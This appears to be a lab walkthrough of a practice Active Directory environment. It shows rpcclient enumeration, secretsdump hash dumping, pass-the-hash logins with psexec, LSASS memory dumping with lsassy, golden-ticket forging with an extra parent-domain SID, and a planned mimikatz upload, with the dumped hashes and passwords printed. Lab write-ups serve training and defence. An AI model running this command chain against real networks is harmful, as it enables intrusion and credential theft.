Since I got one user credentials for Winterfell which is `robb.stark:sexywolfy`, let's try to connect to it via rpcclient.

`rpcclient -U 'robb.stark%sexywolfy' 10.4.10.11`

By running `enumdomusers` I get the list of users:

![Pasted_image_20250107135937](https://github.com/user-attachments/assets/1d53e4bf-1791-4918-9ab7-a909503794f8)

Then I get the list of groups by running `enumdomgroups`:

![Pasted_image_20250107140035](https://github.com/user-attachments/assets/e16c66bf-f4a9-4bce-9ce6-4f32a423f49c)

Now, since I want to get the members of the Domain Admins, i use `qureygroupmem 0x200`:

![Pasted_image_20250107140129](https://github.com/user-attachments/assets/76aa0b9e-16f1-448c-bed3-c2cd7711aaaf)

Here I see the `rid-s` of the members of Domain Admin group, which are `0x1f4` and `0x457`, and by looking at the users I can conclude that the members of this admin group are:

`user:[Administrator] rid:[0x1f4]`
`user:[eddard.stark] rid:[0x457]`

Now, let's get the hashes, by using `secretsdump.py`, and running:

```bash
secretsdump.py north.sevenkingdoms.local/robb.stark:sexywolfy@10.4.10.11
```

I got:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:34b24f1a67d914d8ef876f8bd02f3f0b:::
localuser:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
arya.stark:1110:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::
eddard.stark:1111:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::
catelyn.stark:1112:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::
robb.stark:1113:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::
sansa.stark:1114:aad3b435b51404eeaad3b435b51404ee:b777555c2e2e3716e075cc255b26c14d:::
brandon.stark:1115:aad3b435b51404eeaad3b435b51404ee:84bbaa1c58b7f69d2192560a3f932129:::
rickon.stark:1116:aad3b435b51404eeaad3b435b51404ee:7978dc8a66d8e480d9a86041f8409560:::
hodor:1117:aad3b435b51404eeaad3b435b51404ee:337d2667505c203904bd899c6c95525e:::
jon.snow:1118:aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755:::
samwell.tarly:1119:aad3b435b51404eeaad3b435b51404ee:f5db9e027ef824d029262068ac826843:::
jeor.mormont:1120:aad3b435b51404eeaad3b435b51404ee:6dccf1c567c56a40e56691a723a49664:::
sql_svc:1121:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
WINTERFELL$:1001:aad3b435b51404eeaad3b435b51404ee:8a647d60877c8743dccb8ff2aa18a060:::
CASTELBLACK$:1105:aad3b435b51404eeaad3b435b51404ee:0073abf6ce521277f2d1a148bc955aa9:::
SEVENKINGDOMS$:1104:aad3b435b51404eeaad3b435b51404ee:ac819f7c593d51f56b614f3dcc10f193:::
```


Then by using `Pass the Hash` I use this hash to authenticate as the Domain Admin, using the `psexec.py` tool from `impacket`:

`psexec.py north.sevenkingdoms.local/eddard.stark@10.4.10.11 -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8`

![Pasted_image_20250107141138](https://github.com/user-attachments/assets/53440b38-091b-4885-9587-a2078373621d)

# LSASS Dump

LSASS (Local Security Authority Subsystem Service) is a process which enforces security policy on the system and handles authentication requests, user session management, and other security-related tasks.

Functions of LSASS:
- Authentication Management - Processes login requests for local and domain accounts, and validates user credentials (passwords, NTLM hashes, Kerberos tickets).
- Access Token Creation - After authentication is successful, it creates and assigns an access token to the user or process, defining what resources they can access.
- Kerberos and NTLM Authentication.
- Security Policy Enforcing - Enforces account lockout policies, password requirements and privilege assignments.

I dumped the LSASS memory by using the `lsassy` tool, and passing the hash of "eddard.stark".

`lsassy -u eddard.stark -p "" -H d977b98c6c9282c5c478be1d97b237b8 -d north.sevenkingdoms.local 10.4.10.22`

I dumped the following sensitive information from LSASS Memory:

### NTLM and SHA1 Hashes:

`10.4.10.22 - NORTH\CASTELBLACK$                               [NT] 0073abf6ce521277f2d1a148bc955aa9 | [SHA1] 057ab9db09f89ca2659dcffccbbbf363e896d5af`

`10.4.10.22 - NORTH\robb.stark                                 [NT] 831486ac7f26860c9e2f51ac91e1a07a | [SHA1] 3bea28f1c440eed7be7d423cefebb50322ed7b6c`

`10.4.10.22 - NORTH\sql_svc                                    [NT] 84a5092f53390ea48d660be52b93b804 | [SHA1] 9fd961155e28b1c6f9b3859f32f4779ad6a06404`

`10.4.10.22 - NORTH\jon.snow                                   [NT] b8d76e56e9dac90539aff05e3ccb1755 | [SHA1] 1315aeb7efe3eed73b568094db32a90f2e24a248`

`10.4.10.22 - CASTELBLACK\localuser                            [NT] 8846f7eaee8fb117ad06bdd830b7586c | [SHA1] e8f97fba9104d1ea5047948e6dfb67facd9f5b73`

### Plaintext Passwords

`10.4.10.22 - north.sevenkingdoms.local\CASTELBLACK$           [PWD] wGC870k%/[bHDQHK$eg;5h$>4&t[NygJP]l16jqa?!CaL69P]!=%xk7@qkdZYk&J"61OyMAL+n=6UqSh]kIh:t7spo\t;KNWl>FtN\i<E=VYxG#5hG?mhN(b`

`10.4.10.22 - NORTH.SEVENKINGDOMS.LOCAL\sql_svc                [PWD] YouWillNotKerboroast1ngMeeeeee`

### Kerberos Tickets
`TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_77ebdaad_20250108035512.kirbi`
`TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_936064ee_20250108035512.kirbi`
`TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_cd6de780_20250108072401.kirbi`
`TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_d64496a2_20250108072401.kirbi`
`TGT_NORTH.SEVENKINGDOMS.LOCAL_jon.snow_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_cbdc1708_20250108011355.kirbi`
`TGT_NORTH.SEVENKINGDOMS.LOCAL_jon.snow_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_d6b61eec_20250108011355.kirbi`
`TGT_NORTH.SEVENKINGDOMS.LOCAL_robb.stark_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_63d16d9f_20250108071403.kirbi`
`TGT_NORTH.SEVENKINGDOMS.LOCAL_robb.stark_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_ff508b0c_20250108071403.kirbi`

### Masterkeys

```
{3d4f266a-de48-4dfb-9c6a-66199d459c70}:653eb6c7703e25902ed8155e7155c143cbfdc1c0
{33bfcf95-1f92-4e5e-b6a7-9cb352a2f974}:06d70e6e1288db973a8c9c90068dbed7a619f357
{83cc6bf8-de96-4c69-9873-fa92c33d7472}:3b7ae371d4d1bcb30079333710352f8dbd447a8c
{c824016c-86f8-40d7-80b9-8b8cb456dffd}:05815587d7906ebd6a7704bc859a9b9c7af666f2
{dadb3c63-2a33-4d51-a5a9-195d30522492}:66f6ad8f61a8bf24e5d1531750ec8b6c465b31a6
{df4fb521-2ef6-466b-b985-ba986c151ace}:d5386dd8bb8ceb3a1b7c059a896d71f3ced221ad
{4d72c6d2-f696-4db2-a537-d87f70307e10}:17ec2cd5ac955dacf1b59054f7686e3cf8f28238
{3d4f266a-de48-4dfb-9c6a-66199d459c70}:653eb6c7703e25902ed8155e7155c143cbfdc1c0
{33bfcf95-1f92-4e5e-b6a7-9cb352a2f974}:06d70e6e1288db973a8c9c90068dbed7a619f357
{83cc6bf8-de96-4c69-9873-fa92c33d7472}:3b7ae371d4d1bcb30079333710352f8dbd447a8c
{c824016c-86f8-40d7-80b9-8b8cb456dffd}:05815587d7906ebd6a7704bc859a9b9c7af666f2
{dadb3c63-2a33-4d51-a5a9-195d30522492}:66f6ad8f61a8bf24e5d1531750ec8b6c465b31a6
{df4fb521-2ef6-466b-b985-ba986c151ace}:d5386dd8bb8ceb3a1b7c059a896d71f3ced221ad
{4d72c6d2-f696-4db2-a537-d87f70307e10}:17ec2cd5ac955dacf1b59054f7686e3cf8f28238
{3d4f266a-de48-4dfb-9c6a-66199d459c70}:653eb6c7703e25902ed8155e7155c143cbfdc1c0
{33bfcf95-1f92-4e5e-b6a7-9cb352a2f974}:06d70e6e1288db973a8c9c90068dbed7a619f357
{83cc6bf8-de96-4c69-9873-fa92c33d7472}:3b7ae371d4d1bcb30079333710352f8dbd447a8c
{c824016c-86f8-40d7-80b9-8b8cb456dffd}:05815587d7906ebd6a7704bc859a9b9c7af666f2
{dadb3c63-2a33-4d51-a5a9-195d30522492}:66f6ad8f61a8bf24e5d1531750ec8b6c465b31a6
{df4fb521-2ef6-466b-b985-ba986c151ace}:d5386dd8bb8ceb3a1b7c059a896d71f3ced221ad
{4d72c6d2-f696-4db2-a537-d87f70307e10}:17ec2cd5ac955dacf1b59054f7686e3cf8f28238
```


# Golden Ticket

## Finding SID

`lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 NORTH/EDDARD.STARK@10.4.10.22`

Result:

```
[*] Brute forcing SIDs at 10.4.10.22
[*] StringBinding ncacn_np:10.4.10.22[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3779674392-1109536343-705869415
500: CASTELBLACK\Administrator (SidTypeUser)
501: CASTELBLACK\Guest (SidTypeUser)
503: CASTELBLACK\DefaultAccount (SidTypeUser)
504: CASTELBLACK\WDAGUtilityAccount (SidTypeUser)
513: CASTELBLACK\None (SidTypeGroup)
1000: CASTELBLACK\localuser (SidTypeUser)
1001: CASTELBLACK\SQLServer2005SQLBrowserUser$CASTELBLACK (SidTypeAlias)
```

---------------

Child Domain SID:

`lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 NORTH/EDDARD.STARK@10.4.10.11`

Result:

```
[*] Domain SID is: S-1-5-21-58534182-3680670537-1634125476
500: NORTH\Administrator (SidTypeUser)
501: NORTH\Guest (SidTypeUser)
502: NORTH\krbtgt (SidTypeUser)
512: NORTH\Domain Admins (SidTypeGroup)
513: NORTH\Domain Users (SidTypeGroup)
514: NORTH\Domain Guests (SidTypeGroup)
515: NORTH\Domain Computers (SidTypeGroup)
516: NORTH\Domain Controllers (SidTypeGroup)
517: NORTH\Cert Publishers (SidTypeAlias)
520: NORTH\Group Policy Creator Owners (SidTypeGroup)
521: NORTH\Read-only Domain Controllers (SidTypeGroup)
522: NORTH\Cloneable Domain Controllers (SidTypeGroup)
525: NORTH\Protected Users (SidTypeGroup)
526: NORTH\Key Admins (SidTypeGroup)
553: NORTH\RAS and IAS Servers (SidTypeAlias)
571: NORTH\Allowed RODC Password Replication Group (SidTypeAlias)
572: NORTH\Denied RODC Password Replication Group (SidTypeAlias)
1000: NORTH\localuser (SidTypeUser)
1001: NORTH\WINTERFELL$ (SidTypeUser)
1102: NORTH\DnsAdmins (SidTypeAlias)
1103: NORTH\DnsUpdateProxy (SidTypeGroup)
1104: NORTH\SEVENKINGDOMS$ (SidTypeUser)
1105: NORTH\CASTELBLACK$ (SidTypeUser)
1106: NORTH\Stark (SidTypeGroup)
1107: NORTH\Night Watch (SidTypeGroup)
1108: NORTH\Mormont (SidTypeGroup)
1109: NORTH\AcrossTheSea (SidTypeAlias)
1110: NORTH\arya.stark (SidTypeUser)
1111: NORTH\eddard.stark (SidTypeUser)
1112: NORTH\catelyn.stark (SidTypeUser)
1113: NORTH\robb.stark (SidTypeUser)
1114: NORTH\sansa.stark (SidTypeUser)
1115: NORTH\brandon.stark (SidTypeUser)
1116: NORTH\rickon.stark (SidTypeUser)
1117: NORTH\hodor (SidTypeUser)
1118: NORTH\jon.snow (SidTypeUser)
1119: NORTH\samwell.tarly (SidTypeUser)
1120: NORTH\jeor.mormont (SidTypeUser)
1121: NORTH\sql_svc (SidTypeUser)
```

Parent Domain SID:

`lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 NORTH/EDDARD.STARK@10.4.10.10`

```
498: SEVENKINGDOMS\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SEVENKINGDOMS\Administrator (SidTypeUser)
501: SEVENKINGDOMS\Guest (SidTypeUser)
502: SEVENKINGDOMS\krbtgt (SidTypeUser)
512: SEVENKINGDOMS\Domain Admins (SidTypeGroup)
513: SEVENKINGDOMS\Domain Users (SidTypeGroup)
514: SEVENKINGDOMS\Domain Guests (SidTypeGroup)
515: SEVENKINGDOMS\Domain Computers (SidTypeGroup)
516: SEVENKINGDOMS\Domain Controllers (SidTypeGroup)
517: SEVENKINGDOMS\Cert Publishers (SidTypeAlias)
518: SEVENKINGDOMS\Schema Admins (SidTypeGroup)
519: SEVENKINGDOMS\Enterprise Admins (SidTypeGroup)
520: SEVENKINGDOMS\Group Policy Creator Owners (SidTypeGroup)
521: SEVENKINGDOMS\Read-only Domain Controllers (SidTypeGroup)
522: SEVENKINGDOMS\Cloneable Domain Controllers (SidTypeGroup)
525: SEVENKINGDOMS\Protected Users (SidTypeGroup)
526: SEVENKINGDOMS\Key Admins (SidTypeGroup)
527: SEVENKINGDOMS\Enterprise Key Admins (SidTypeGroup)
553: SEVENKINGDOMS\RAS and IAS Servers (SidTypeAlias)
571: SEVENKINGDOMS\Allowed RODC Password Replication Group (SidTypeAlias)
572: SEVENKINGDOMS\Denied RODC Password Replication Group (SidTypeAlias)
1000: SEVENKINGDOMS\localuser (SidTypeUser)
1001: SEVENKINGDOMS\KINGSLANDING$ (SidTypeUser)
1102: SEVENKINGDOMS\DnsAdmins (SidTypeAlias)
1103: SEVENKINGDOMS\DnsUpdateProxy (SidTypeGroup)
1104: SEVENKINGDOMS\NORTH$ (SidTypeUser)
1105: SEVENKINGDOMS\ESSOS$ (SidTypeUser)
1106: SEVENKINGDOMS\Lannister (SidTypeGroup)
1107: SEVENKINGDOMS\Baratheon (SidTypeGroup)
1108: SEVENKINGDOMS\Small Council (SidTypeGroup)
1109: SEVENKINGDOMS\DragonStone (SidTypeGroup)
1110: SEVENKINGDOMS\KingsGuard (SidTypeGroup)
1111: SEVENKINGDOMS\DragonRider (SidTypeGroup)
1112: SEVENKINGDOMS\AcrossTheNarrowSea (SidTypeAlias)
1113: SEVENKINGDOMS\tywin.lannister (SidTypeUser)
1114: SEVENKINGDOMS\jaime.lannister (SidTypeUser)
1115: SEVENKINGDOMS\cersei.lannister (SidTypeUser)
1116: SEVENKINGDOMS\tyron.lannister (SidTypeUser)
1117: SEVENKINGDOMS\robert.baratheon (SidTypeUser)
1118: SEVENKINGDOMS\joffrey.baratheon (SidTypeUser)
1119: SEVENKINGDOMS\renly.baratheon (SidTypeUser)
1120: SEVENKINGDOMS\stannis.baratheon (SidTypeUser)
1121: SEVENKINGDOMS\petyer.baelish (SidTypeUser)
1122: SEVENKINGDOMS\lord.varys (SidTypeUser)
1123: SEVENKINGDOMS\maester.pycelle (SidTypeUser)
```

So, the SIDs are: 

Child Domain: `S-1-5-21-58534182-3680670537-1634125476`
Parent Domain: `S-1-5-21-3848810514-1890589760-83533814`
krbtgt hash: `34b24f1a67d914d8ef876f8bd02f3f0b`
krbtgt aes: `badd865cdb6de2c5ee6e1d2baa1e02ff52b2bee490a90f1ee3d2624ad9aa9580`


`ticketer.py -nthash 34b24f1a67d914d8ef876f8bd02f3f0b -domain-sid S-1-5-21-58534182-3680670537-1634125476 -domain north.sevenkingdoms.local -extra-sid S-1-5-21-3848810514-1890589760-83533814 goldenuser`

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
/home/kali/.local/bin/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  aTime = timegm(datetime.datetime.utcnow().timetuple())
[*] Customizing ticket for north.sevenkingdoms.local/goldenuser
/home/kali/.local/bin/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
/home/kali/.local/bin/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
/home/kali/.local/bin/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
/home/kali/.local/bin/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in goldenuser.ccache
```



Parent domain NTDS
`secretsdump -k -no-pass -just-dc-ntlm north.sevenkingdoms.local/goldenuser@kingslanding.sevenkingdoms.local   `

### Working Golden Ticket

`ticketer.py -aesKey badd865cdb6de2c5ee6e1d2baa1e02ff52b2bee490a90f1ee3d2624ad9aa9580 -domain-sid S-1-5-21-58534182-3680670537-1634125476 -extra-pac -domain north.sevenkingdoms.local -user-id 1111 eddard.stark`

`export KRB5CCNAME=/home/kali/eddard.stark.ccache`

`wmiexec.py -k -no-pass north.sevenkingdoms.local/eddard.stark@winterfell.north.sevenkingdoms.local`


# GOLDEN TICKET MIMIKATZ

### Upload Mimikatz to target

Use smbvclient to pass the hash with Robb.Stark and upload the mimikatz file.

`smbclient.py -hashes :831486ac7f26860c9e2f51ac91e1a07a NORTH/robb.stark@10.4.10.22`

Logn in with PSEXEC and pass-the-hash:

`psexec.py north.sevenkingdoms.local/eddard.stark@10.4.10.22 -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8`

